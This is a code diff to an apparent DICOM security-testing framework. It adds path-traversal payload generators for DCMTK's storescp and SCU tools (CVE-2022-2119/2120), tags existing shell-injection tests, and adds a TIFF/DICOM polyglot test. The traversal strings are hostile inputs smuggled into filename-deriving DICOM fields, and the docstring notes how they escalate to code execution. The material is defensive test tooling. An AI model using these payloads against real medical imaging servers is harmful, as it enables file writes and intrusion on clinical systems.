@@ -12,7 +12,7 @@ The catalog has two roles in C-SCARE:
 
 Pre-built attack patterns derived from:
 1. DICOM protocol specification edge cases
-2. Real-world CVEs (2019-2024)
+2. Real-world CVEs (2019-2026)
 3. Fuzzer test cases
 
 Attack Categories:
@@ -21,6 +21,7 @@ Attack Categories:
     MemoryAttacks      - Buffer overflows, allocation exhaustion
     LogicAttacks       - Semantic confusion, state violations
     CommandInjectionAttacks - Shell injection via storescp exec placeholders
+    PathTraversalAttacks - Directory traversal in stored DICOM filenames
     StateMachineAttacks - DICOM state machine (Sta1-Sta13) violations
     CVEAttacks         - CVE-specific reproductions
 
@@ -29,10 +30,14 @@ CVE Coverage:
     CVE-2024-24793  - Use-After-Free in File Meta Info
     CVE-2024-24794  - Use-After-Free in Sequence parsing
     CVE-2024-33606  - SSRF via URI Value Representation
-    CVE-2019-11687  - Executable embedding (PEDICOM/ELFDICOM)
+    CVE-2019-11687  - Executable embedding (PEDICOM/ELFDICOM/TIFF)
     CVE-2024-22100  - Heap-based buffer overflow
     CVE-2024-25578  - Out-of-bounds write
     CVE-2024-28877  - Stack-based buffer overflow
+    CVE-2024-34509  - dcmdata segfault via invalid DIMSE message
+    CVE-2026-5663   - OS command injection via storescp exec placeholders
+    CVE-2022-2119   - SCP path traversal in stored DICOM filenames
+    CVE-2022-2120   - SCU path traversal in stored DICOM filenames
 
 Example:
     from c_scare.attacks import ParserAttacks, CVEAttacks, ProtocolSeedGenerator
@@ -107,6 +112,7 @@ __all__ = [
     'MemoryAttacks',
     'LogicAttacks',
     'CommandInjectionAttacks',
+    'PathTraversalAttacks',
     'StateMachineAttacks',
     'CVEAttacks',
     # Seed generators (corpus emitters for AFL++/AFLNet; not fuzzing engines)
@@ -650,7 +656,13 @@ class ProtocolAttacks:
 
     @staticmethod
     def invalid_command_field() -> AttackResult:
-        """DIMSE command with invalid command field (0xDEAD)."""
+        """DIMSE command with invalid command field (0xDEAD).
+
+        Black-box analogue of the invalid-DIMSE-message segfault class:
+        CVE-2024-34509 (dcmdata command-set parsing). The dcmnet sibling
+        CVE-2024-34508 is covered by the AFLNet net campaign, which mutates
+        full DIMSE sessions on the network-receive path.
+        """
         if not SCAPY_AVAILABLE:
             payload = b''
         else:
@@ -667,6 +679,7 @@ class ProtocolAttacks:
             payload=payload,
             description='DIMSE command with invalid field 0xDEAD',
             expected_behavior='Target should reject invalid command',
+            metadata={'cve': 'CVE-2024-34509'},
         )
 
     @classmethod
@@ -1049,7 +1062,7 @@ class LogicAttacks:
 class CommandInjectionAttacks:
     """
     Shell command injection via storescp's execution-option placeholders
-    (DCMTK issue #1194).
+    (DCMTK issue #1194, CVE-2026-5663).
 
     ``storescp`` substitutes attacker-controlled DICOM values into a command
     run through ``/bin/sh -c`` whenever ``--exec-on-reception`` (``-xcr``) or
@@ -1127,6 +1140,7 @@ class CommandInjectionAttacks:
             expected_behavior='storescp must sanitise shell metacharacters '
                               'before substituting the #f placeholder',
             metadata={
+                'cve': 'CVE-2026-5663',
                 'dcmtk_issue': 1194,
                 'placeholder': '#f',
                 'requires_option': '--exec-on-reception / --exec-on-eostudy',
@@ -1156,6 +1170,7 @@ class CommandInjectionAttacks:
             expected_behavior='storescp must sanitise shell metacharacters '
                               'before substituting the #p placeholder',
             metadata={
+                'cve': 'CVE-2026-5663',
                 'dcmtk_issue': 1194,
                 'placeholder': '#p',
                 'requires_option': '--exec-on-* with --sort-on-study-uid (-su)',
@@ -1185,6 +1200,7 @@ class CommandInjectionAttacks:
             expected_behavior='storescp must sanitise shell metacharacters '
                               'before substituting the #p placeholder',
             metadata={
+                'cve': 'CVE-2026-5663',
                 'dcmtk_issue': 1194,
                 'placeholder': '#p',
                 'requires_option': '--exec-on-* with --sort-on-patientname (-sp)',
@@ -1207,6 +1223,162 @@ class CommandInjectionAttacks:
         # #p via Patient Name (needs --sort-on-patientname).
         for pid in ('semicolon', 'subshell', 'newline'):
             yield cls.patient_name_injection(pid)
+
+
+# =============================================================================
+# Path Traversal Attacks - directory traversal in stored DICOM filenames
+# =============================================================================
+
+class PathTraversalAttacks:
+    """
+    Relative path traversal in the DICOM attributes that DCMTK tools use to
+    build the names of the files they write to disk (CVE-2022-2119 /
+    CVE-2022-2120, fixed in DCMTK 3.6.7).
+
+    storescp / dcmrecv name each received object after DICOM attributes:
+
+        received file   <- SOP Instance UID  (0008,0018)
+        per-study dir   <- Study Instance UID (0020,000D)  with --sort-on-study-uid
+        per-patient dir <- Patient Name      (0010,0010)  with --sort-on-patientname
+
+    The SCU tools (movescu / getscu) write incoming C-MOVE / C-GET
+    sub-operation results the same way. Before 3.6.7 these values were used
+    unsanitised, so ``../`` (POSIX) or ``..\\`` (Windows) sequences let a
+    peer write DICOM files outside the intended storage directory under a
+    controlled name -- a write primitive that can escalate to RCE by landing
+    a file in a startup / cron / web-root path.
+
+    CVE-2022-2119 is the SCP side: deliver these with ``deliver.send_cstore``
+    to a live storescp. CVE-2022-2120 is the SCU side: serve the same crafted
+    dataset from ``c_scare.server.RawSCP`` to a connecting client. The
+    payloads are identical -- only the delivery direction differs.
+
+    Pure payload generators - no network I/O. ``metadata`` carries the
+    matching sop_class_uid / sop_instance_uid for send_cstore.
+    """
+
+    # (id, traversal value, description) - directory-escape sequences left
+    # unsanitised on the filename-deriving attributes.
+    _TRAVERSAL_PAYLOADS = [
+        ('posix',    '../../../../../../tmp/c-scare-traversal',
+         'POSIX relative traversal'),
+        ('windows',  '..\\..\\..\\..\\..\\..\\Windows\\Temp\\c-scare-traversal',
+         'Windows relative traversal'),
+        ('absolute', '/tmp/c-scare-traversal/escaped',
+         'absolute path escaping the storage root'),
+        ('mixed',    '..\\../..\\../..\\../c-scare-traversal',
+         'mixed forward/back separators'),
+        ('encoded',  '..%2f..%2f..%2f..%2fc-scare-traversal',
+         'URL-encoded traversal sequence'),
+    ]
+
+    @classmethod
+    def _lookup(cls, payload_id: str) -> Tuple[str, str]:
+        """Return (traversal value, description) for a payload id."""
+        for pid, value, note in cls._TRAVERSAL_PAYLOADS:
+            if pid == payload_id:
+                return value, note
+        raise ValueError(f'unknown traversal payload id: {payload_id!r}')
+
+    @staticmethod
+    def _base_dataset() -> Dataset:
+        """A small, storable image object carrying placeholder identifiers."""
+        ds = Dataset()
+        ds = ds / Element(0x0008, 0x0016, 'UI', SECONDARY_CAPTURE_SOP_CLASS_UID)
+        ds = ds / Element(0x0008, 0x0018, 'UI', '1.2.3.4.5')      # SOP Instance UID
+        ds = ds / Element(0x0008, 0x0060, 'CS', 'OT')             # Modality
+        ds = ds / Element(0x0010, 0x0010, 'PN', 'Doe^John')       # Patient Name
+        ds = ds / Element(0x0010, 0x0020, 'LO', '12345')          # Patient ID
+        ds = ds / Element(0x0020, 0x000D, 'UI', '1.2.3.4.5.1')    # Study Instance UID
+        ds = ds / Element(0x0020, 0x000E, 'UI', '1.2.3.4.5.2')    # Series Instance UID
+        return ds
+
+    @classmethod
+    def sop_instance_uid_traversal(cls, payload_id: str = 'posix') -> AttackResult:
+        """Path traversal in SOP Instance UID - drives the received file name."""
+        value, note = cls._lookup(payload_id)
+        ds = cls._base_dataset()
+        ds[0x00080018] = Element(0x0008, 0x0018, 'UI', value)
+        return AttackResult(
+            name=f'path_traversal_sop_uid_{payload_id}',
+            category='path_traversal',
+            payload=ds.encode(),
+            description=f'SOP Instance UID carries a {note}',
+            expected_behavior='storescp/SCU must sanitise path separators '
+                              'before naming the received file',
+            metadata={
+                'cve': 'CVE-2022-2119',
+                'target_field': '(0008,0018) SOP Instance UID',
+                'traversal_payload': value,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': value,
+            },
+        )
+
+    @classmethod
+    def study_instance_uid_traversal(cls, payload_id: str = 'posix') -> AttackResult:
+        """Path traversal in Study Instance UID - drives the per-study dir.
+
+        Reached when storescp runs with --sort-on-study-uid (-su).
+        """
+        value, note = cls._lookup(payload_id)
+        ds = cls._base_dataset()
+        ds[0x0020000D] = Element(0x0020, 0x000D, 'UI', value)
+        return AttackResult(
+            name=f'path_traversal_study_uid_{payload_id}',
+            category='path_traversal',
+            payload=ds.encode(),
+            description=f'Study Instance UID carries a {note}',
+            expected_behavior='storescp must sanitise path separators before '
+                              'naming the per-study subdirectory',
+            metadata={
+                'cve': 'CVE-2022-2119',
+                'requires_option': '--sort-on-study-uid (-su)',
+                'target_field': '(0020,000D) Study Instance UID',
+                'traversal_payload': value,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @classmethod
+    def patient_name_traversal(cls, payload_id: str = 'posix') -> AttackResult:
+        """Path traversal in Patient Name - drives the per-patient dir.
+
+        Reached when storescp runs with --sort-on-patientname (-sp).
+        """
+        value, note = cls._lookup(payload_id)
+        ds = cls._base_dataset()
+        ds[0x00100010] = Element(0x0010, 0x0010, 'PN', value)
+        return AttackResult(
+            name=f'path_traversal_patient_name_{payload_id}',
+            category='path_traversal',
+            payload=ds.encode(),
+            description=f'Patient Name carries a {note}',
+            expected_behavior='storescp must sanitise path separators before '
+                              'naming the per-patient subdirectory',
+            metadata={
+                'cve': 'CVE-2022-2119',
+                'requires_option': '--sort-on-patientname (-sp)',
+                'target_field': '(0010,0010) Patient Name',
+                'traversal_payload': value,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @classmethod
+    def all(cls) -> Generator[AttackResult, None, None]:
+        """Yield every path-traversal attack payload."""
+        # SOP Instance UID always names the received file: full sweep.
+        for pid, _value, _note in cls._TRAVERSAL_PAYLOADS:
+            yield cls.sop_instance_uid_traversal(pid)
+        # Study Instance UID names the per-study dir (needs -su).
+        for pid in ('posix', 'windows', 'absolute'):
+            yield cls.study_instance_uid_traversal(pid)
+        # Patient Name names the per-patient dir (needs -sp).
+        for pid in ('posix', 'windows', 'absolute'):
+            yield cls.patient_name_traversal(pid)
 
 
 # =============================================================================
@@ -1700,7 +1872,29 @@ class CVEAttacks:
             expected_behavior='Scanner should detect batch script',
             metadata={'cve': 'CVE-2019-11687', 'polyglot': 'batch'}
         ))
-        
+
+        # Test 5: TIFF header in preamble (dual-purpose TIFF/DICOM)
+        # The CVE explicitly cites whole-slide-imaging TIFF/DICOM polyglots
+        # as a real-world dual-purpose case.
+        tiff = b'II*\x00'                     # TIFF little-endian (Intel) magic
+        tiff += struct.pack('<I', 8)          # offset to first IFD
+        tiff += struct.pack('<H', 0)          # IFD with 0 directory entries
+        tiff += struct.pack('<I', 0)          # no next IFD
+        tiff += b'\x00' * (128 - len(tiff))   # pad out the 128-byte preamble
+
+        file_data = tiff + b'DICM'
+        file_data += struct.pack('<HH', 0x0008, 0x0016) + b'UI' + struct.pack('<H', 26)
+        file_data += b'1.2.840.10008.5.1.4.1.1.7\x00'
+
+        results.append(AttackResult(
+            name='cve_2019_11687_05_tiff_header',
+            category='cve',
+            payload=file_data,
+            description='TIFF header in DICOM preamble (dual-purpose TIFF/DICOM)',
+            expected_behavior='Scanner should detect TIFF signature',
+            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'TIFF'}
+        ))
+
         return results
 
     @classmethod
